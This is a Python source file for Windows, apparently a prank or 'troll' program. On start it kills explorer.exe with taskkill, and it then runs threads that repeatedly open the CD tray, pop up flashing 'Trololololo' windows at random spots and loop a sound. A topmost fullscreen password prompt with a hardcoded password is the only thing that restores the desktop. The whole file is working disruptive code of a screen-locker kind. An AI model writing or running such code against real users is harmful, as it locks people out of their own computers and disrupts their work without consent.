import time, os, ctypes, tkinter as tk, random, winsound
from threading import Thread

os.system("taskkill /f /im explorer.exe")

class ersteKlasse(Thread):
        def __init__(self):
            Thread.__init__(self)

        def run(self):
                time.sleep(5)
                while True:
                        ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)
                        time.sleep(random.randint(2, 5))



class zweiteKlasse(Thread):
    def __init__(self):
        Thread.__init__(self)

    def run(self):
        zaehler = 0
        nenner = 20
        passwort = "PWforTroll"
        antwort = ""
        antwort1 = ""
        time.sleep(3)
        while(True):
            def center_window(width="200", height="160"):

                x = random.randint(10, 1000)
                y = random.randint(100,500)
                
                root.geometry('%dx%d+%d+%d' % (550, 150, x, y))

            if zaehler == nenner:
                zaehler = 0
                nenner += nenner
                def senden(eingabewidget, labelwidget):
                    pwdinput = str(eingabewidget.get())
                    if pwdinput != passwort:  
                            time.sleep(1)
                            ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)
                            root.destroy()

                    if pwdinput == passwort:
                            time.sleep(1)
                            os.system("%systemroot%\sysnative\cmd.exe /c start /B explorer.exe")
                            os.system("taskkill /f /im pythonw.exe")



                #GUI
                root = tk.Tk()
                root.attributes("-topmost", True)
                root.attributes("-toolwindow",1)
                root.configure(bg="yellow")
                root.overrideredirect(True)
                root.geometry("{0}x{1}+0+0".format(root.winfo_screenwidth(), root.winfo_screenheight()))

                #Überschrift
                labelStart = tk.Label(root, text="Passwort", bg="yellow", fg="red", width=200, font=("Comic Sans MS",200))
                labelStart.pack()

                #Antwort
                labelAntwort = tk.Label(root, text=antwort, width=200, bg="white", fg="black")

                #Eingabe
                eingabe = tk.Entry(root, show="*", width=25, text=antwort1, font=("Comic Sans MS", 30))
                eingabe.pack()

                button = tk.Button(root,
                                        text = "eingabe",
                                        height=2, width=15,
                                        font=("Comic Sans MS", 20),
                                        command = lambda: senden(eingabe, labelAntwort))
                button.pack()
                root.mainloop()
                
            zaehler += 1
            
            root = tk.Tk()
            root.attributes("-topmost", True)
            root.title("Trololololo")
            root.configure(bg="red")
            tk.Label(root,
                        fg="yellow",
                        bg="red",
                        text="Trololololo",
                        font=("Comic Sans MS", 80)).pack()
            root.after(500, lambda: root.destroy())
            center_window(200, 160)
            root.mainloop()
            
class dritteKlasse(Thread):
        def __init__(self):
                Thread.__init__(self)

        def run(self):
                while True:
                        winsound.PlaySound("troll.wav", winsound.SND_ASYNC | winsound.SND_ALIAS )
                        time.sleep(162)
                
if __name__=='__main__':
        a=ersteKlasse()
        b=zweiteKlasse()
        c=dritteKlasse()

        a.start()
        b.start()
        c.start()
